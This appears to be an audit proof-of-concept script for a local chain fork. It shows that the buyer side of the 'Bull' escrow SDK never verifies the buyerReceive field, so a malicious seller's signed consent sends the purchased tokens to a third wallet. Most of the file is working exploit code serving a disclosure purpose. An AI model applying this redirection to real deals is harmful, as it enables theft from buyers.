// A1 — buyer-side clients never verify sellerPayout / buyerReceive (Lane A candidate A1).
//
// SCENARIO (all wallets are throwaway test keys; everything runs on the LOCAL fork):
//   seller (malicious counterparty) signs a consent naming a THIRD wallet as
//   buyerReceive — with raw signTypedData, as any counterparty can (Bull's own
//   bull_sign_terms would refuse this, which is exactly the asymmetry: the seller-side
//   clients pin these fields, bull-mcp.mjs:206-207 / bull.mjs:152, the buyer-side
//   clients never check them at all).
//   The buyer then runs the UNMODIFIED official SDK (poc/bull.mjs, sha256-identical to
//   repos/site-served/bull.mjs) open() + fund() against a stub API that returns the
//   createDeal carrying that redirection. open()'s on-chain comparison (bull.mjs:
//   217-219) checks buyer/seller/sellToken/sellAmount/payToken/payAmount only, and
//   #deal() (bull.mjs:111-114) drops deals() indices 10/11 — so the buyer funds a deal
//   whose tokens will settle to the third wallet, with no warning.
// PROVEN BELOW: open() succeeds silently; after both sides fund, the mock sell tokens
// land at the THIRD wallet (balance == sellAmount) and the buyer receives 0, while the
// seller is paid in full.
//
// RE-RUN: fork running + `node setup-fork.mjs` once, then `node a1/run.mjs`.
import { createWalletClient, http, parseAbi, formatEther } from "viem";
import { spawn } from "node:child_process";
import { readFileSync } from "node:fs";
import { loadKeys, forkClient, forkChain, RPC_FORK, ESCROW, ZERO, CONSENT_FIELDS, ESCROW_DOMAIN, POC_DIR } from "../lib.mjs";
import { resetFork } from "../setup-fork.mjs";
import { Bull } from "../bull.mjs";

const log = (...a) => console.log(...a);
const K = loadKeys();
await resetFork();
const st = JSON.parse(readFileSync(POC_DIR + "/fork-state.json", "utf8"));
const MOCK = st.mock;
const MOCK_ABI = parseAbi(["function balanceOf(address) view returns (uint256)"]);
const DEALS = parseAbi(["function deals(uint256) view returns (address buyer,address seller,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline,bool buyerFunded,bool sellerFunded,uint8 status,address sellerPayout,address buyerReceive,uint16 feeBps)"]);
const pub = forkClient();
const stub = spawn("node", [POC_DIR + "/a1/stub.mjs"], { stdio: ["ignore", "pipe", "pipe"] });
stub.stdout.on("data", (d) => process.stdout.write(d));
stub.stderr.on("data", (d) => process.stderr.write(d));
await new Promise((r) => setTimeout(r, 1200));
try {
  log("=== A1: buyer-side payout-redirection non-verification — fork proof with the UNMODIFIED SDK ===");
  log(`roles: buyer=${K.buyer.address} seller=${K.seller.address} third=${K.third.address}`);
  // 1. seller signs a consent with buyerReceive = third wallet (raw signing; no client protects the buyer from this)
  const now = Number((await pub.getBlock()).timestamp);
  const deadline = BigInt(now + 86400), validUntil = BigInt(now + 3600);
  const sellerSig = await K.seller.signTypedData({ domain: ESCROW_DOMAIN, types: { Consent: CONSENT_FIELDS }, primaryType: "Consent", message: {
    buyer: K.buyer.address, seller: K.seller.address, sellerPayout: ZERO, buyerReceive: K.third.address,
    sellToken: MOCK, sellAmount: 100000000n, payToken: ZERO, payAmount: 10000000000000000n, deadline, validUntil } });
  log(`seller signed consent with buyerReceive = ${K.third.address} (NOT the buyer)`);
  // 2. buyer opens the deal with the stock SDK — note: no buyerReceive is passed by the buyer at all
  const buyerBull = new Bull({ walletClient: createWalletClient({ account: K.buyer, chain: forkChain, transport: http(RPC_FORK) }), publicClient: pub, baseUrl: "http://localhost:8791" });
  const dealId = await buyerBull.open({ seller: K.seller.address, sellToken: MOCK, sellAmount: "100", payAsset: "eth", payAmount: "0.01", sellerSig, validUntil: String(validUntil), deadline: String(deadline) });
  log(`SDK open() returned dealId ${dealId} — NO error, NO warning about the redirection`);
  const d = await pub.readContract({ address: ESCROW, abi: DEALS, functionName: "deals", args: [BigInt(dealId)] });
  log(`on-chain deals(${dealId}): sellerPayout (idx 10) = ${d[10]}, buyerReceive (idx 11) = ${d[11]}`);
  log(`  -> the redirection was on-chain and readable the whole time; SDK #deal() returns only idx 0-5,7-9 and open() compares only those fields (bull.mjs:111-114, 217-219)`);
  // 3. buyer funds (pays 0.01 ETH), seller funds (delivers 100 MOCK) — settlement fires
  const sellerEthBefore = await pub.getBalance({ address: K.seller.address });
  const h1 = await buyerBull.fund(dealId);
  log(`buyer fund() sent: ${h1.join(", ")}`);
  const sellerBull = new Bull({ walletClient: createWalletClient({ account: K.seller, chain: forkChain, transport: http(RPC_FORK) }), publicClient: pub, baseUrl: "http://localhost:8791" });
  const h2 = await sellerBull.fund(dealId);
  log(`seller fund() sent: ${h2.join(", ")}`);
  await buyerBull.waitSettled(dealId, { timeoutMs: 8000, everyMs: 500 });
  log("SDK waitSettled() confirms settlement (its chain cross-check passed too)");
  // 4. where did the tokens go?
  const dAfter = await pub.readContract({ address: ESCROW, abi: DEALS, functionName: "deals", args: [BigInt(dealId)] });
  const balThird = await pub.readContract({ address: MOCK, abi: MOCK_ABI, functionName: "balanceOf", args: [K.third.address] });
  const balBuyer = await pub.readContract({ address: MOCK, abi: MOCK_ABI, functionName: "balanceOf", args: [K.buyer.address] });
  const sellerEthAfter = await pub.getBalance({ address: K.seller.address });
  log(`deal status after funding: ${dAfter[9]} (2 = settled)`);
  log(`MOCK balance of THIRD wallet: ${balThird} (expected 100000000 = the full sellAmount)`);
  log(`MOCK balance of BUYER:        ${balBuyer} (expected 0 — the buyer paid and received nothing)`);
  log(`seller ETH: ${formatEther(sellerEthBefore)} -> ${formatEther(sellerEthAfter)} (paid ~0.0099 ETH = 0.01 minus the 1% fee, less gas)`);
  const proven = Number(dAfter[9]) === 2 && balThird === 100000000n && balBuyer === 0n;
  log(`\n=== A1 VERDICT: ${proven ? "PROVEN on the local fork" : "NOT PROVEN — see log"} ===`);
  log("The unmodified official SDK opened and funded a deal whose buyerReceive redirected the purchased tokens to a third wallet; every buyer-side check passed and settlement paid the seller in full.");
} finally { stub.kill(); }
